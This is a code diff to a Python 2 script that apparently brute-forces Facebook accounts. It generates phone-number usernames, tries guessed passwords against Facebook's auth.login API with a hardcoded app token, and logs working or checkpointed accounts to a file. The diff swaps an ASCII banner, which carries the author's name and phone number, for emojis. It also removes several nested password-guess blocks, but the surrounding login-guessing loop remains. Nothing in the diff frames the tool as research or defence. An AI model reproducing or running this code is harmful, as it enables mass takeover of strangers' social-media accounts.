@@ -58,7 +58,7 @@ def cb():
     os.system('clear')
 
 
-logo = "\n\x1b[1;92m  d8888b.    .d88b.    .d8888.   .d8888.\n\x1b[1;92m  88  `8D   .8P  Y8.   88'  YP   88'  YP\n\x1b[1;92m  88oooY'   88    88   `8bo.     `8bo.\n\x1b[1;92m  88~~~b.   88    88     `Y8b.     `Y8b.\n\x1b[1;92m  88   8D   `8b  d8'   db   8D   db   8D\n\x1b[1;92m  Y8888P'    `Y88P'    `8888Y'   `8888Y'\n\x1b[1;97m-----------------------------------------------\n\x1b[1;92m> PROGRAMER   : MUHAMMAD MUDASAR\n\x1b[1;92m> FACEBOOK    : MUHAMMAD MUDASAR\n\x1b[1;92m> WHATSAPP    : 03174050946\n\x1b[1;97m-----------------------------------------------"
+logo = "❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️😍😍😍😍😍😍😍😍😍😍😍😍😍🤣🤣🤣😂😂😂😂😂😂😂😂😂😂😂😂😂🥰🥰🥰🥰🥰🥰🥰🥰🥰🥰🧡🧡🧡🧡"
 back = 0
 successful = []
 cpb = []
@@ -161,70 +161,6 @@ def action():
                 cps.write(k + c + user + pass1 + '\n')
                 cps.close()
                 cpb.append(k + c + user + pass1)
-            else:
-                pass2 = k + c + user
-                data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
-                q = json.load(data)
-                if 'access_token' in q:
-                    print '\x1b[1;32mSuccessful ' + k + c + user + '  |  ' + pass2
-                    okb = open('save/cloned.txt', 'a')
-                    okb.write(k + c + user + pass2 + '\n')
-                    okb.close()
-                    oks.append(k + c + user + pass2)
-                elif 'www.facebook.com' in q['error_msg']:
-                    print '\x1b[1;31mCheckpoint ' + k + c + user + '  |  ' + pass2
-                    cps = open('save/cloned.txt', 'a')
-                    cps.write(k + c + user + pass2 + '\n')
-                    cps.close()
-                    cpb.append(k + c + user + pass2)
-                else:
-                   pass3 = au1
-                   data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
-                   q = json.load(data)
-                   if 'access_token' in q:
-                       print '\x1b[1;32mSuccessful ' + k + c + user + '  |  ' + pass3
-                       okb = open('save/cloned.txt', 'a')
-                       okb.write(k + c + user + pass3 + '\n')
-                       okb.close()
-                       oks.append(k + c + user + pass3)
-                   elif 'www.facebook.com' in q['error_msg']:
-                       print '\x1b[1;31mCheckpoint ' + k + c + user + '  |  ' + pass3
-                       cps = open('save/cloned.txt', 'a')
-                       cps.write(k + c + user + pass3 + '\n')
-                       cps.close()
-                       cpb.append(k + c + user + pass3)
-                   else:
-                      pass4 = au2
-                      data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass4 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
-                      q = json.load(data)
-                      if 'access_token' in q:
-                          print '\x1b[1;32mSuccessful ' + k + c + user + '  |  ' + pass4
-                          okb = open('save/cloned.txt', 'a')
-                          okb.write(k + c + user + pass4 + '\n')
-                          okb.close()
-                          oks.append(k + c + user + pass4)
-                      elif 'www.facebook.com' in q['error_msg']:
-                          print '\x1b[1;31mCheckpoint ' + k + c + user + '  |  ' + pass4
-                          cps = open('save/cloned.txt', 'a')
-                          cps.write(k + c + user + pass4 + '\n')
-                          cps.close()
-                          cpb.append(k + c + user + pass4)
-                      else:
-                         pass5 = au3
-                         data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass5 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
-                         q = json.load(data)
-                         if 'access_token' in q:
-                             print '\x1b[1;32mSuccessful ' + k + c + user + '  |  ' + pass5
-                             okb = open('save/cloned.txt', 'a')
-                             okb.write(k + c + user + pass5 + '\n')
-                             okb.close()
-                             oks.append(k + c + user + pass5)
-                         elif 'www.facebook.com' in q['error_msg']:
-                             print '\x1b[1;31mCheckpoint ' + k + c + user + '  |  ' + pass5
-                             cps = open('save/cloned.txt', 'a')
-                             cps.write(k + c + user + pass5 + '\n')
-                             cps.close()
-                             cpb.append(k + c + user + pass5)
         except:
             pass
 
